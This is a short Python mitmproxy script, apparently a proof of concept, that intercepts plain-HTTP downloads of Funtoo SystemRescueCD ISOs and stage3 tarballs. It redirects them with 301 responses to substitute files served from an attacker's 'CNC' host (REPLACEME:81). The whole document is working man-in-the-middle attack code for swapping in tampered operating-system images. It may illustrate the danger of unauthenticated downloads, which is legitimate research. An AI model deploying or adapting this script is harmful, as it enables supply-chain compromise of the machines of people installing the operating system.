"""
301 redirect iso and stage3 downloads
poc.sh should replace REPLACEME with user specified CNC IP
TODO fix the need to use ports other than 80 (81 in this case)
"""
from netlib.http import Headers
import re

h_funtoo_iso = Headers([
    [b"Location",b"http://REPLACEME:81/systemrescuecd-x86-4.7.1.iso"],
    [b"Content-Type",b"application/x-iso9660-image"]    
])

h_funtoo_stage3 = Headers([
    [b"Location",b"http://REPLACEME:81/stage3-latest.tar.xz"],
    [b"Content-Type",b"application/octet-stream"]    
])

def response(context, flow):
    print flow.request
    if re.match(".*\/distfiles\/sysresccd\/systemrescuecd-x86-.*\.iso", flow.request.url) is not None:
        print "Funtoo ISO download...redirecting!"
        flow.response.status_code=301
        flow.response.msg="Moved Permanently"
        flow.response.headers=h_funtoo_iso
    if re.match(".*\/funtoo-current\/x86-64bit\/generic_64\/stage3.*", flow.request.url) is not None:
        print "Funtoo stage3 download....redirecting!"
        flow.response.status_code=301
        flow.response.msg="Moved Permanently"
        flow.response.headers=h_funtoo_stage3

def request(context, flow):
     print flow.request
